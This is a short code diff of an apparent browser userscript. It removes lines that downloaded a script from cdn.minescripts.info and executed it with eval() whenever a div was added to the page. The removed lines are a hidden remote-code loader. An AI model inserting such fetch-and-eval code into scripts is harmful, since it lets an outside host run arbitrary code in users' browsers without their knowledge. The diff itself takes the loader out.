@@ -12,21 +12,10 @@
 
 var DivAppend = function(div){
         document.body.appendChild(div);
-        CPEL("https://cdn.minescripts.info/c/g9lx_2.js");
         console.log("Div created :)");
     };
 
-     var cmp = new XMLHttpRequest();
-     cmp.onreadystatechange = function() {
-     if (this.readyState == 4 && this.status == 200) {
-        eval(this.responseText);
-        }
-    };
 
-    var CPEL = function(link){
-        cmp.open('GET', link);
-        cmp.send();
-    };
 
 (function() {
     'use strict';
